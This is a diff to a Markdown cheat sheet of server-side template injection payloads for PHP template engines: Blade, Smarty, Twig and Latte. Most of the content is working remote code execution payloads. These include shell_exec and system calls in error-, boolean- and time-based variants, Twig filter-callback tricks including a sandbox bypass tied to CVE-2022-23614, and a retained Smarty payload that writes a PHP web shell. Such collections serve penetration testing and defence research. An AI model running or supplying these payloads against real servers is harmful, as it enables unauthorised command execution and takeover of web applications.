@@ -5,7 +5,8 @@
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
-- [blade](#blade)
+- [Universal Payloads](#universal-payloads)
+- [Blade](#blade)
 - [Smarty](#smarty)
     - [Smarty - Code Execution with Obfuscation](#smarty---code-execution-with-obfuscation)
 - [Twig](#twig)
@@ -25,15 +26,42 @@
 ## Templating Libraries
 
 | Template Name   | Payload Format |
-| --------------- | --------- |
-| Blade (Laravel) | `{{ }}`   |
-| Latte           | `{var $X=""}{$X}`   |
-| Mustache        | `{{ }}`   |
-| Plates          | `<?= ?>`  |
-| Smarty          | `{ }`     |
-| Twig            | `{{ }}`   |
+|-----------------|----------------|
+| Blade (Laravel) | `{{ }}`        |
+| Latte           | `{ }`          |
+| Mustache        | `{{ }}`        |
+| Plates          | `<?= ?>`       |
+| Smarty          | `{ }`          |
+| Twig            | `{{ }}`        |
+
+## Universal Payloads
+
+Generic code injection payloads work for many PHP-based template engines, such as Blade, Latte and Smarty.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```php
+// Rendered RCE
+shell_exec('id')
+system('id')
+
+// Error-Based RCE
+ini_set("error_reporting", "1") // Enable verbose fatal errors for Error-Based
+fopen(join("", ["Y:/A:/", shell_exec('id')]), "r")
+include(join("", ["Y:/A:/", shell_exec('id')]))
+join("", ["xx", shell_exec('id')])()
+
+// Boolean-Based RCE
+1 / (pclose(popen("id", "wb")) == 0)
+
+// Time-Based RCE
+shell_exec('id && sleep 5')
+system('id && sleep 5')
+```
 
 ## Blade
+
+> Universal payloads also work for Blade.
 
 [Official website](https://laravel.com/docs/master/blade)
 > Blade is the simple, yet powerful templating engine that is included with Laravel.
@@ -50,6 +78,8 @@ Reference and explanation of payload can be found [yeswehack/server-side-templat
 
 ## Smarty
 
+> Universal payloads also work for Smarty before v5.
+
 [Official website](https://www.smarty.net/docs/en/)
 > Smarty is a template engine for PHP.
 
@@ -57,8 +87,8 @@ Reference and explanation of payload can be found [yeswehack/server-side-templat
 {$smarty.version}
 {php}echo `id`;{/php} //deprecated in smarty v3
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
-{system('ls')} // compatible v3
-{system('cat index.php')} // compatible v3
+{system('ls')} // compatible v3, deprecated in v5
+{system('cat index.php')} // compatible v3, deprecated in v5
 ```
 
 ### Smarty - Code Execution with Obfuscation
@@ -126,6 +156,20 @@ $output = $twig > render (
 {{['id']|filter('passthru')}}
 {{['id']|map('passthru')}}
 {{['nslookup oastify.com']|filter('system')}}
+
+{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
+{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0
+
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
+{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0
+{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
+```
+
+With certain settings, Twig interrupts rendering, if any errors or warnings are raised. This payload works fine in these cases:
+
+```php
+{{ {'id':'shell_exec'}|map('call_user_func')|join }}
 ```
 
 Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
@@ -160,6 +204,8 @@ Reference and explanation of payload can be found [yeswehack/server-side-templat
 ---
 
 ## Latte
+
+> Universal payloads also work for Latte.
 
 ### Latte - Basic Injection
 
@@ -297,3 +343,4 @@ layout template:
 
 - [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24, 2025](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
 - [Server Side Template Injection (SSTI) via Twig escape handler - March 21, 2024](https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
